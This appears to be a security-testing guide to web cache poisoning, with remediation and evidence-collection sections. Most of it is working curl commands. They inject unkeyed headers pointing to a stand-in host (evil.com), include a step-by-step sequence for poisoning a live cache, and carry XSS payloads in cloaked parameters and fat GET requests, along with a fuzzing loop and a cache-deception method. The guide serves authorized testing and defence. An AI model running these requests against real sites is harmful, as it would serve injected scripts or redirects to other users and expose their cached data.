# Web Cache Poisoning Testing

## Overview
Web cache poisoning exploits the difference between how caches generate cache keys and how back-end servers process full requests. By injecting malicious content through inputs that are not part of the cache key (unkeyed inputs), an attacker can store a poisoned response in the cache that is then served to other users. This can enable stored XSS at scale, redirection to malicious sites, and denial of service.

## Classification
- **CWE:** CWE-444 (Inconsistent Interpretation of HTTP Requests), CWE-525 (Use of Web Browser Cache Containing Sensitive Information)
- **OWASP:** A05:2021 - Security Misconfiguration
- **CVSS Base:** 6.1 - 9.8 (Critical when XSS is cached and served to all users)

## Detection Methodology

### 1. Identify Caching Behavior
```bash
# Check for caching headers
curl -s -D- https://target.com/ | grep -iE "(x-cache|cf-cache|age:|cache-control|x-served|x-varnish|via:)"

# Key indicators:
# X-Cache: HIT / MISS
# Age: 300
# CF-Cache-Status: HIT
# X-Varnish: 12345 67890
# Via: 1.1 varnish
# Cache-Control: public, max-age=3600
```

### 2. Identify Unkeyed Inputs
The cache key typically includes: host, path, query string. Headers and cookies are often unkeyed.

**Test common unkeyed headers:**
```bash
# Add cache buster to isolate tests, then inject headers
curl -s -D- "https://target.com/?cb=test123" \
  -H "X-Forwarded-Host: evil.com"

curl -s -D- "https://target.com/?cb=test456" \
  -H "X-Forwarded-Scheme: http"

curl -s -D- "https://target.com/?cb=test789" \
  -H "X-Original-URL: /admin"
```

**Headers to test as unkeyed inputs:**
```
X-Forwarded-Host
X-Forwarded-Scheme
X-Forwarded-Proto
X-Forwarded-Port
X-Original-URL
X-Rewrite-URL
X-Host
X-Forwarded-Server
X-HTTP-Method-Override
X-Amz-Website-Redirect-Location
Forwarded
True-Client-IP
X-Custom-IP-Authorization
X-WAP-Profile
```

### 3. Unkeyed Header Poisoning

**X-Forwarded-Host injection (redirect/XSS):**
```bash
# Step 1: Find reflected header (use cache buster)
curl -s "https://target.com/?cb=poison1" -H "X-Forwarded-Host: evil.com" | grep "evil.com"

# Step 2: If reflected, poison the cache (remove cache buster)
curl -s "https://target.com/" -H "X-Forwarded-Host: evil.com"

# Step 3: Verify cache poisoning
curl -s "https://target.com/" | grep "evil.com"
```

**X-Forwarded-Scheme (force HTTP redirect):**
```bash
curl -s -D- "https://target.com/" -H "X-Forwarded-Scheme: http"
# If this triggers a redirect to http://target.com → combined with Host poisoning for redirect to attacker
```

**X-Original-URL / X-Rewrite-URL (path override):**
```bash
curl -s "https://target.com/innocent" -H "X-Original-URL: /admin"
# If back-end serves /admin content but cache stores it under /innocent
```

### 4. Parameter Cloaking
Exploit differences in parameter parsing between the cache and back-end:

```bash
# Semicolon as delimiter (Ruby/Java parse it, cache may ignore it)
curl -s "https://target.com/page?innocent=1;malicious=<script>alert(1)</script>"

# Duplicate parameters (first vs last wins)
curl -s "https://target.com/page?param=safe&param=<script>alert(1)</script>"

# URL-encoded parameter separators
curl -s "https://target.com/page?safe=1%26evil=<script>alert(1)</script>"

# UTM parameter cloaking (often unkeyed by CDN)
curl -s "https://target.com/page?utm_content=<script>alert(1)</script>"
```

### 5. Cache Key Normalization Attacks

**Path normalization:**
```bash
# Encoded slashes (cache may normalize, back-end may not, or vice versa)
curl -s "https://target.com/%2F%2Fadmin"
curl -s "https://target.com/./admin"
curl -s "https://target.com/foo/../admin"

# Case sensitivity (cache may be case-insensitive)
curl -s "https://target.com/SETTINGS"  # vs /settings
```

**Port-based cache key differences:**
```bash
curl -s "https://target.com:443/" -H "Host: target.com"
# Cache may key on target.com:443 but serve content for target.com
```

### 6. Fat GET Requests
```bash
# Some frameworks process body on GET requests, but caches ignore the body
curl -s -X GET "https://target.com/api/data" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "param=<script>alert(1)</script>"
```

### 7. Cache Deception (Related Attack)
Trick the cache into storing authenticated responses:
```bash
# If path-based caching is used for static resources
# Victim visits: https://target.com/account/settings/nonexistent.css
# Cache stores authenticated /account/settings response under .css path
# Attacker requests same URL and gets victim's cached data
```

## Tool Usage
```bash
# Param Miner (Burp Extension) - automated unkeyed input discovery
# Right-click request → Extensions → Param Miner → Guess headers/params

# Web Cache Vulnerability Scanner
wcvs -u https://target.com -w wordlist.txt

# Nuclei cache poisoning templates
nuclei -u https://target.com -t http/cves/ -t http/misconfiguration/ \
  -tags cache -batch

# Manual cache buster + header fuzzing
for header in "X-Forwarded-Host" "X-Forwarded-Scheme" "X-Original-URL" \
  "X-Rewrite-URL" "X-Forwarded-Proto" "X-Host"; do
  cb=$(date +%s%N)
  echo "--- $header ---"
  curl -s "https://target.com/?cb=$cb" -H "$header: evil.com" \
    | grep -i "evil.com"
done

# Cache timing analysis
for i in $(seq 1 5); do
  curl -s -D- -o /dev/null -w "Time: %{time_total}s\n" "https://target.com/"
done
```

## Remediation
1. **Minimize unkeyed inputs** -- include all inputs that affect the response in the cache key
2. **Disable unnecessary headers** -- reject or ignore X-Forwarded-Host, X-Original-URL unless needed
3. **Cache only truly static content** -- do not cache responses that vary by headers or cookies
4. **Use Vary header correctly** -- `Vary: X-Forwarded-Host` if the response depends on it
5. **Sanitize inputs** -- even cached responses should have properly escaped dynamic content
6. **Set appropriate Cache-Control** -- use `private`, `no-store` for sensitive or personalized content
7. **Normalize cache keys** -- ensure cache and origin agree on URL parsing, encoding, and parameter handling
8. **Review CDN configuration** -- audit which query parameters and headers are included in the cache key

## Evidence Collection
- Cache key composition (which inputs are keyed vs unkeyed)
- Unkeyed header/parameter that affects the response
- Poisoned cache response demonstrating injected content
- Cache headers (X-Cache, Age, Via) confirming the poisoned response is being served
- Multiple requests showing the poisoned response served to different users
- Impact assessment (XSS scope, number of users affected, data exposed)
- Cache TTL and how long the poison persists
